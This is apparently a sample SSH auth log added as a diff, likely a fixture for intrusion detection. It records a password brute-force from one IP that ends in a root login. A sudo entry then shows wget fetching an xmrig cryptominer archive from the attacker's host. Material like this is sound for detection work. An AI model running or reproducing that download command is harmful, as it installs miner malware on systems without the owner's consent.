@@ -1,0 +1,19 @@
+Mar 12 08:14:22 srv01 sshd[1201]: Accepted publickey for admin from 10.0.0.5 port 52144 ssh2
+Mar 12 09:02:11 srv01 sshd[1344]: Accepted password for deploy from 192.168.1.24 port 49822 ssh2
+Mar 12 09:15:03 srv01 sshd[1402]: Failed password for invalid user test from 45.83.66.20 port 51230 ssh2
+Mar 12 09:15:05 srv01 sshd[1409]: Failed password for invalid user admin from 45.83.66.20 port 51246 ssh2
+Mar 12 09:15:07 srv01 sshd[1413]: Failed password for root from 45.83.66.20 port 51258 ssh2
+Mar 12 09:15:09 srv01 sshd[1420]: Failed password for invalid user oracle from 45.83.66.20 port 51271 ssh2
+Mar 12 09:15:11 srv01 sshd[1428]: Failed password for root from 45.83.66.20 port 51284 ssh2
+Mar 12 09:15:13 srv01 sshd[1435]: Failed password for invalid user pi from 45.83.66.20 port 51299 ssh2
+Mar 12 09:15:15 srv01 sshd[1441]: Failed password for ubuntu from 45.83.66.20 port 51304 ssh2
+Mar 12 09:15:17 srv01 sshd[1449]: Failed password for root from 45.83.66.20 port 51318 ssh2
+Mar 12 09:15:19 srv01 sshd[1456]: Failed password for invalid user guest from 45.83.66.20 port 51331 ssh2
+Mar 12 09:16:44 srv01 sshd[1520]: Accepted password for root from 45.83.66.20 port 51402 ssh2
+Mar 12 09:17:01 srv01 sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://45.83.66.20/xmrig.tar.gz
+Mar 12 09:18:26 srv01 sshd[1601]: Failed password for postgres from 185.220.101.7 port 33012 ssh2
+Mar 12 09:18:28 srv01 sshd[1608]: Failed password for postgres from 185.220.101.7 port 33025 ssh2
+Mar 12 09:18:30 srv01 sshd[1615]: Failed password for postgres from 185.220.101.7 port 33038 ssh2
+Mar 12 10:22:41 srv01 sshd[2210]: Accepted publickey for deploy from 192.168.1.24 port 50190 ssh2
+Mar 12 11:45:09 srv01 sshd[2841]: Invalid user backup from 91.240.118.172 port 41022
+Mar 12 11:45:11 srv01 sshd[2848]: Invalid user backup from 91.240.118.172 port 41035
